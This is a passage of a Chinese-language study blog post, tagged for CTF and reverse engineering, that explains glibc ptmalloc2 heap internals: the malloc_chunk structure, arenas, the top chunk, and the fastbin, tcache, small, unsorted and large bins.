<li>管理用户所释放的内存，一般来说，用户释放的内存并不是直接返回给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li>
</ol>
<p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 <code>malloc/free</code> 函数来分配和释放内存块。</p>
<p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>
<h2 id="堆的最小结构—chunk"><a href="#堆的最小结构—chunk" class="headerlink" title="堆的最小结构—chunk"></a>堆的最小结构—chunk</h2><p>在程序的执行过程中，我们称<code>malloc</code>申请的内存为chunk。这块内存在<code>ptmalloc</code>内部用<code>malloc_chunk</code>结构体来表示。当申请的chunk被free后，会被加入到相应的空闲管理列表中。</p>
<p>无论一个<code>chunk</code>的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。虽然它们使用同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p>
<p><code>malloc_chunk</code>的结构如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span><br><span class="line">  // Size of previous chunk (if free).</span><br><span class="line">  INTERNAL_SIZE_T mchunk_prev_size;</span><br><span class="line">  // Size in bytes, including overhead.</span><br><span class="line">  INTERNAL_SIZE_T mchunk_size;</span><br><span class="line">  // double links -- used only if free.</span><br><span class="line">  struct malloc_chunk* fd;         </span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line">  // Only used for large blocks: pointer to next larger size.</span><br><span class="line">  // double links -- used only if free.</span><br><span class="line">  struct malloc_chunk* fd_nextsize;</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>prev_size</code>：当前一个chunk为free（空闲可用）时，<code>prev_size</code>表示前一个空闲chunk大小；当前一个chunk已经使用时，<code>prev_size</code>借用给前一个chunk保存数据以提高内存使用率。</li>
<li>size：当前chunk大小，包括<code>malloc_chunk</code>头结构。size数据的低三个bit有特殊用途，作用分别如下：<ol>
<li><code>bit0-PREV_INUSE</code>，若前一个chunk在使用时，该位置1</li>
<li><code>bit1-IS_MAPPED</code>，当该chunk是通过<code>mmap</code>获得的时候（即大内存），该位置1</li>
<li><code>bit2-NON_MAIN_AREA</code>，当该chunk为Thread area时，该位置1</li>
</ol>
</li>
</ol>
<p>​	<strong>当需要获取当前chunk大小时，直接将size的低三位置为0即可得chunk大小。</strong></p>
<ol start="3">
<li><p><code>fd：forward pointer</code>，指向同一个bin中下一个free chunk。</p>
</li>
<li><p><code>bk：backward pointer</code>，指向同一个bin中前一个free chunk。</p>
</li>
<li><p><code>fd_nextsize</code>和<code>bk_nextsize</code>也是两个指针，这两个指针只在large chunk中会用到。(指向第一个与当前chunk大小不同的第一个空闲块，不包含bin头指针)。</p>
</li>
<li><p><code>fd</code>和<code>bk</code>字段只有在当前chunk为free chunk时才使用。若当前chunk已经使用，则不存在<code>fd</code>和<code>bk</code>字段，也即从<code>fd</code>开始即存放用户数据。</p>
</li>
<li><p>系统为了保证内存对齐，实际分配的内存可能大于请求内存大小。</p>
</li>
</ol>
<h2 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h2><p>一个线程申请的1个&#x2F;多个堆包含很多的信息：二进制位信息，多个<code>malloc_chunk</code>信息等这些堆需要东西来进行管理，那么Arena就是来管理线程中的这些堆的。</p>
<ul>
<li>一个线程只有一个<code>arnea</code>，并且这些线程的<code>arnea</code>都是独立的不是相同的。</li>
<li>主线程的<code>arnea</code>称为“main_arena”。子线程的<code>arnea</code>称为“thread_arena”。</li>
<li>使用<code>x/32gx &amp;main_arena</code>查看<code>main_arena</code>。</li>
</ul>
<h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>堆中的第一个堆块。即当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：(1)用户请求的chunk；(2)剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过<code>sbrk</code>扩展heap，而在thread arena中通过<code>mmap</code>分配新的heap。该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。</p>
<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><p>bin是一个由struct chunk结构体组成的链表。不同的chunk根据特点不同分为不同的chunk，为了将这些chunk进行分类的管理，glibc采用了bin链这种方式管理不同的chunk。不同的bin链是由arena管理的。bin链中的chunk均为free chunk。 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin，<code>tcachbin</code>。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。</p>
<ol>
<li><code>fastbin</code>所包含的chunk大小为16 Bytes，24 Bytes，32 Bytes，…，80 Bytes。当分配一块较小的内存(mem&lt;&#x3D;64 Bytes)时，会首先检查对应大小的<code>fastbin</code>中是否包含未被使用的chunk，如果存在则直接将其从<code>fastbin</code>中移除并返回。否则通过其他方式(剪切top chunk)得到一块符合大小要求的chunk并返回。每个fast bin都是一个单链表，只是使用fd指针，不会对freechunk进行合并操作。</li>
<li>tcachebins是一个长度为64的字节数组，每个字节数组对应一条链表。所以tcachebins只能存放0x0-0x400大小的堆，且每个链表长度为7。并且类似于fastbins，是一个单链表。在释放大小为0x0-0x400大小的堆的时候，首先会被释放入对应长度tcachebins对应的链表中，当长度超出7后，再放入fastbin或unsortbins中。malloc的时候当发现malloc对应大小的堆，先从tcachebins中取出。注意当如果从fastbin中取出了一个块，那么会把剩余的块放入tcache中直至填满tcache（smallbin中也是一样）。如果进入了unsortedbin，且chunk的size和当前申请的大小精确匹配，那么在tcache未满的情况下会将其放入到tcachebin中。</li>
<li>small bin用于小于1024字节（0x400）的chunk(称之为small chunk)，small bin就是用于管理small chunk的。small bin链表的个数为62个。</li>
<li>unsorted bin 当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。</li>
<li>large bin 大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的。large bin链表的个数为63个，被分为6组。largechunk使用fd_nextsize、bk_nextsize连接起来的。在这63个largebins中：第一组的32个largebin链依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。第二组的16个largebin链依次以512字节步长为间隔；第三组的8个largebin链以步长4096为间隔；第四组的4个largebin链以32768字节为间隔；第五组的2个largebin链以262144字节为间隔；最后一组的largebin链中的chunk大小无限制。</li>
</ol>
]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
